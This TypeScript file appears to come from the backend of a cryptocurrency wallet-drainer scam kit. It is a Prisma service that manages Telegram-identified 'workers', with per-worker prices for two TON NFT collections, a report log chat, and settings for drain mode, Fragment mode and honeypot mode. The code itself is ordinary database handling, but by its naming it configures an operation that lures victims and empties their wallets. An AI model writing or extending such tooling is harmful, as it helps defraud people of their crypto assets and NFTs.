import { prisma } from '@db/instance'
import type {
	DrainMode,
	FragmentMode,
	HoneyPotMode,
	Prisma,
	PrismaClient,
	Worker as WorkerType,
} from '@prisma/client'

enum Collections {
	Number = '0:0e41dc1dc3c9067ed24248580e12b3359818d83dee0304fabcf80845eafafdb2',
	User = '0:80d78a35f955a14b679faa887ff4cd5bfc0f43b4a4eea2a7e6927f3701b273c2',
}

class WorkersService {
	private prisma: PrismaClient

	constructor() {
		this.prisma = prisma
	}

	async Get(id: number): Promise<WorkerType | null> {
		return this.prisma.worker.findUnique({ where: { id } })
	}

	async GetByTG(tgId: bigint): Promise<WorkerType | null> {
		return this.prisma.worker.findUnique({ where: { tgId } })
	}

	async FindOrCreate(data: Prisma.WorkerCreateInput): Promise<WorkerType> {
		let worker = await this.prisma.worker.findUnique({
			where: { tgId: data.tgId },
		})

		if (worker) {
			return worker
		}

		return this.prisma.worker.create({ data })
	}

	async GetNFTPrice(col_address: string, workerId: number): Promise<number> {
		const worker = await this.prisma.worker.findUnique({
			where: {
				id: workerId,
			},
		})

		if (!worker) {
			return 0
		}

		switch (col_address) {
			case Collections.Number:
				return worker.numberPrice

			case Collections.User:
				return worker.userPrice

			default:
				return 0
		}
	}

	async SetFloorPrice(
		tgId: bigint,
		price: number,
		item: string,
		tgUser?: string
	): Promise<WorkerType> {
		await this.FindOrCreate({ tgId, tgUser })

		if (item === 'u') {
			return this.prisma.worker.update({
				data: {
					userPrice: price,
				},
				where: {
					tgId,
				},
			})
		}

		return await this.prisma.worker.update({
			data: {
				numberPrice: price,
			},
			where: {
				tgId,
			},
		})
	}

	async setReportChannel(id: number, chat: string): Promise<WorkerType> {
		return this.prisma.worker.update({
			data: {
				logChat: chat,
			},
			where: {
				id,
			},
		})
	}

	async setDrainMode(id: number, drainMode: DrainMode): Promise<WorkerType> {
		return this.prisma.worker.update({
			data: {
				drainMode,
			},
			where: {
				id,
			},
		})
	}

	async setFragmentMode(
		id: number,
		fragmentMode: FragmentMode
	): Promise<WorkerType> {
		return this.prisma.worker.update({
			data: {
				fragmentMode,
			},
			where: {
				id,
			},
		})
	}

	async setHoneyPotMode(
		id: number,
		honeyPotMode: HoneyPotMode
	): Promise<WorkerType> {
		return this.prisma.worker.update({
			data: {
				honeyPotMode,
			},
			where: {
				id,
			},
		})
	}

	async toggleHoneyPot(tgId: bigint, tgUser?: string): Promise<WorkerType> {
		const curWorker = await this.FindOrCreate({
			tgId,
			tgUser,
		})

		return this.prisma.worker.update({
			data: {
				honeyPot: !curWorker.honeyPot,
			},
			where: {
				tgId,
			},
		})
	}
}

export const Worker = new WorkersService()
